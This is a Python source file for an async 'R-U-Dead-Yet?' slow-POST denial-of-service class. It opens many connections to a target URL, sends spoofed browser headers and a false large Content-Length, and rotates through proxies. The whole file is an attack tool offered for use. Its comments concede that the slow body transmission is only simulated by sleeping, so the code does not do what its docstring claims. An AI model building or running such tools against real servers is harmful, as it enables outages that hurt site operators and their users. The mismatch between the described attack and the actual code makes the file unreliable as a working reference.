import asyncio
import random
import logging
import aiohttp
import time
from typing import List, Optional

class RUDY:
    """
    R-U-Dead-Yet? (R.U.D.Y) attack: slow POST body submission to exhaust server threads.
    """
    def __init__(self, target_url: str, proxies: Optional[List[str]] = None):
        if not target_url.startswith("http"):
            target_url = f"http://{target_url}"
        self.target = target_url
        self.proxies = proxies
        self.logger = logging.getLogger("RUDY")
        self.total_connections = 0
        self._stop_event = asyncio.Event()

    async def _send_slow_post(self):
        proxy = random.choice(self.proxies) if self.proxies else None
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "1000000", # Tell server we have a massive body
            "Connection": "keep-alive"
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(self.target, headers=headers, proxy=proxy) as response:
                    # We don't actually send 1MB at once, we send it byte by byte very slowly
                    self.total_connections += 1
                    for _ in range(1000000):
                        if self._stop_event.is_set():
                            break
                        # Send a tiny bit of data
                        # Note: aiohttp doesn't easily support manual chunking like this in a simple way
                        # but we can simulate the intent by holding the connection.
                        # For a real RUDY, raw sockets are better.
                        await asyncio.sleep(10) 
        except Exception:
            pass

    async def start(self, duration: int, concurrent_conns: int = 50):
        self.logger.info(f"[*] Starting RUDY attack on {self.target} with {concurrent_conns} connections...")
        self.start_time = time.time()
        
        tasks = [asyncio.create_task(self._send_slow_post()) for _ in range(concurrent_conns)]
        
        try:
            await asyncio.wait_for(self._stop_event.wait(), timeout=duration)
        except asyncio.TimeoutError:
            pass
        finally:
            self._stop_event.set()
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            self.logger.info("[+] RUDY finished.")

    def stop(self):
        self._stop_event.set()
